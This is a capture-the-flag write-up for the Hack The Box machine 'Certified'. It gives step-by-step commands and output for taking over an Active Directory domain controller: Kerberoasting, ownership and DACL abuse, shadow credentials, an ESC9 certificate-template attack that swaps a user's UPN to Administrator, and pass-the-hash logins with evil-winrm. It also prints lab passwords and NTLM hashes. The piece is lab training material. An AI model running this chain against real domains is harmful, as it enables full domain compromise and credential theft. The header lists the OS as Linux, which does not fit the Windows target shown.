# Target
| Category       | Details                                                    |
|----------------|------------------------------------------------------------|
| 📝 Name        | [Certified](https://app.hackthebox.com/machines/Certified) |
| 🏷 Type        | HTB Machine                                                |
| 🖥️ OS          | Linux                                                      |
| 🎯 Difficulty  | Medium                                                     |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ nmap -sS -sC $TARGET                                                                                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-14 15:16 CET
Nmap scan report for 10.129.121.177
Host is up (0.027s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: 2025-03-14T21:16:47+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp open  wsman

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2025-03-14T21:16:37
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 52.44 seconds
```

# Foothold
Scan shows domain controller for `certified.htb`, so let's add it to `/etc/hosts`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ echo "$TARGET certified.htb" | sudo tee -a /etc/hosts
10.129.121.177 certified.htb
```

In this machine we have been provided with initial credentials `judith.mader:judith09`, so let's poke around and check what we could do with it. Starting with remote management.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ evil-winrm -i certified.htb -u judith.mader -p judith09
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

No luck there. Let's enumerate SMB.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ smbmap -u judith.mader -p judith09 -H certified.htb --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.121.177:445      Name: certified.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
``` 

Also nothing interesting. Let's try AS-REP Roasting.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ impacket-GetNPUsers certified.htb/judith.mader:judith09 -outputfile hashes.txt -format hashcat
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

Still no luck. With provided credentials we could try Kerberoasting. 
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request -output hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 17:30:51.476756  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

There is one SPN, however clock skew is too great, so let's fix that first.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ sudo timedatectl set-ntp off && \
sudo rdate -n certified.htb
Fri Mar 14 23:11:09 CET 2025
```

Let's retry Kerberoasting.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request -output hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName               Name            MemberOf                                    PasswordLastSet             LastLogon  Delegation 
---------------------------------  --------------  ------------------------------------------  --------------------------  ---------  ----------
certified.htb/management_svc.DC01  management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-13 17:30:51.476756  <never>               



[-] CCache file is not found. Skipping...
```

And try to dictionary attack with `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
```

Unfortunately we were not able break hash for `management_svc`, which was kind of expected as services (svc) typically have strong, random passwords.

Next step in our enumeration will be lookup of abusable paths, from `judith.mader` to `Administrator`, with help of Bloodhound.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ ~/Tools/BloodHound.py/bloodhound.py -d certified.htb -c DCOnly -u judith.mader -p judith09 -ns "$TARGET" -k 
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 computers
INFO: Found 0 trusts
INFO: Done in 00M 02S
```

With data collected, let's start Bloodhound (I'm using docker) and upload what we have gathered.
```
┌──(magicrc㉿perun)-[~/attack]/HTB Certified
└─$ curl -L https://ghst.ly/getbhce > docker-compose.yml && \
sudo docker compose up
```

With little bit of pathfinding we have found following attack vector:
![Bloodhound](images/bloodhound.png)

Our objective will be to escalate to `ca_operator` thru `management_svc`, hoping that we could escalate further to `Administrator` due to certificate template misconfiguration. We will do so in the following steps:
* Add `judith.mader` to `management` group - `WriteOwner` abuse.
* As `judith.mader` add shadow credentials to `management_svc` - `GenericWrite` abuse.
* As `management_svc` add shadow credentials to `ca_operator` - `GenericAll` abuse.

Let's execute first part of our plan, starting with add `judith.mader` to `management` group.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ impacket-owneredit -dc-ip certified.htb -action write -target management -new-owner judith.mader certified.htb/judith.mader:judith09 && \
impacket-dacledit -dc-ip certified.htb -action write -rights FullControl -principal judith.mader -target management certified.htb/judith.mader:judith09 && \
net rpc group addmem management judith.mader -U certified.htb/judith.mader%judith09 -S certified.htb
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
[*] DACL backed up to dacledit-20250314-235519.bak
[*] DACL modified successfully!
```

Now we can add shadow credentials to `management_svc`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ python3 ~/Tools/pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: cc1e7d84-aa27-17a2-050d-47e1d67c2bc5
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 8bzI0Q6B.pfx
[+] PFX exportiert nach: 8bzI0Q6B.pfx
[i] Passwort für PFX: l4V8gaMAGqje9YLy2wSz
[+] Saved PFX (#PKCS12) certificate & key at path: 8bzI0Q6B.pfx
[*] Must be used with password: l4V8gaMAGqje9YLy2wSz
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

And use it to obtain NTLM hash.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad cert -export -pfx 8bzI0Q6B.pfx -password l4V8gaMAGqje9YLy2wSz -out management_svc.pfx && \
certipy-ad auth -pfx management_svc.pfx -username management_svc -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'management_svc.pfx'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```

With `management_svc` hash we could try to get shell using remote management.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

Finally we were able to gain foothold! Let's grab user flag and continue escalation.
```
*Evil-WinRM* PS C:\Users\management_svc\Documents> cat C:\Users\management_svc\Desktop\user.txt
********************************
```

# Priviliges escalation
We will continue with last step of our initial plan and add shadow credentials for `ca_operator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ python3 ~/Tools/pywhisker/pywhisker/pywhisker.py -d certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 --target ca_operator --action add
[*] Searching for the target account
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 81ac6fd4-0e25-ea64-5bc0-683dc3d2b2e6
[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: WKwlYU2h.pfx
[+] PFX exportiert nach: WKwlYU2h.pfx
[i] Passwort für PFX: yLOLHgAdtV548l38lhs0
[+] Saved PFX (#PKCS12) certificate & key at path: WKwlYU2h.pfx
[*] Must be used with password: yLOLHgAdtV548l38lhs0
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

And once again we will retrieve NTLM hash this time for `ca_operator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad cert -export -pfx WKwlYU2h.pfx -password yLOLHgAdtV548l38lhs0 -out ca_operator.pfx && \
certipy-ad auth -pfx ca_operator.pfx -username ca_operator -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'ca_operator.pfx'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Got hash for 'ca_operator@certified.htb': aad3b435b51404eeaad3b435b51404ee:b4b86f45c6018f1b664f70805f45d8f2
```

With `ca_operator` hash obtained we can lookup vulnerable certificates.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[!] Failed to resolve: DC01.certified.htb
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: [Errno -2] Name or service not known
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via RRP: [Errno Connection error (DC01.certified.htb:445)] [Errno -2] Name or service not known
[!] Failed to get CA configuration for 'certified-DC01-CA'
[!] Failed to resolve: DC01.certified.htb
[!] Got error while trying to check for web enrollment: [Errno -2] Name or service not known
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

We can see in output that [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension) vulnerability has been detected for `CertifiedAuthentication`. Will continue with`certipy-ad` to exploit this vulnerability to escalate to `Administartor`.

In our scenario, `management_svc` has `GeneriAll` against `ca_operator` and wants to compromise `Administrator`. `ca_operator` is allowed to enroll in a vulnerable template (`CertifiedAuthentication`)  that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

Starting with chaning `userPrincipalName` of `ca_operator` to `Administrator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ ┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Next we will request vulnerable certificate can be requested as `ca_operator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad req -username ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -target certified.htb -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Switching back `userPrincipalName` of `ca_operator` from `Administrator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator'
```

After those steps we can authenticate with the obtained `administrator.pfx` certificate to obtain `Administrator` NTLM hash. 
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

And use to spawn shell with remote management and grab root flag.
```
┌──(magicrc㉿perun)-[~/attack/HTB Certified]
└─$ evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
********************************
```
